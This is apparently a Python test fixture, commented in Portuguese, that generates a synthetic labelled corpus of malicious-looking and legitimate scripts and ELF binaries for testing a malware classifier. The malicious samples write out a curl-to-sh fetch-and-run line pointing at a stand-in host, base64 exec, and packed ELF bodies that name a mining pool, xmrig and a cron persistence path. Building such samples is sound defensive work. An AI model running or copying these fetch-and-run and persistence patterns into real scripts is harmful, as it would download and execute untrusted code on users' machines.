"""Corpus sintetico inofensivo para os testes ponta a ponta: imitacoes de tecnicas, nada executavel de verdade."""
import base64
import hashlib

from ml_elf import make_elf

from tools.treino.corpus import Corpus, Entry


def _script_malicioso(i: int) -> bytes:
    payload = base64.b64encode(f"print('inofensivo {i}')\n".encode() * 30).decode()
    if i % 2:
        return f"#!/bin/sh\ncurl -s http://exemplo.invalid/{i} | sh\nnohup ./x{i} >/dev/null 2>&1 &\n".encode()
    return f"import base64\nexec(base64.b64decode('{payload}'))\n# {i}\n".encode()


def _script_legitimo(i: int) -> bytes:
    if i % 2:
        return f"#!/bin/sh\nset -e\necho 'configurando {i}'\nmkdir -p /tmp/build{i}\n".encode()
    return f"import os\n\ndef principal():\n    return os.getcwd() + '{i}'\n".encode()


def _elf(i: int, malicioso: bool) -> bytes:
    if malicioso:
        corpo = f"stratum+tcp://pool{i}.exemplo.invalid:3333\0xmrig\0/etc/cron.d/x{i}\0".encode()
        return make_elf(sections=[("UPX0", 8, 6, 0x400000, b""), ("UPX1", 1, 6, 0x500000, corpo * 20)],
                        segments=[(1, 7)], dynsyms=["socket", "connect", "fork"])
    corpo = f"programa legitimo {i}\0usage: prog [opcoes]\0".encode()
    return make_elf(sections=[(".text", 1, 6, 0x401000, b"\x90" * (64 + i)), (".rodata", 1, 2, 0x402000, corpo)],
                    segments=[(1, 5), (3, 4)], dynsyms=["printf", "malloc"])


def corpus_sintetico(tmp_path, *, n_scripts: int, n_elf: int):
    raiz = tmp_path / "corpus"
    c = Corpus(raiz)
    itens = [(_script_malicioso(i), 1) for i in range(n_scripts // 2)]
    itens += [(_script_legitimo(i), 0) for i in range(n_scripts // 2)]
    itens += [(_elf(i, True), 1) for i in range(n_elf // 2)]
    itens += [(_elf(i, False), 0) for i in range(n_elf // 2)]
    for n, (data, label) in enumerate(itens):
        sha = hashlib.sha256(data).hexdigest()
        mes = 1 + n % 12
        c.add_bytes(Entry(sha, label, "teste", f"Fam{n % 7}" if label else "legitimo", f"2026-{mes:02d}-01", "r",
                          "malicioso" if label else "geral", package="" if label else f"pkg{n % 40}"), data)
    return raiz
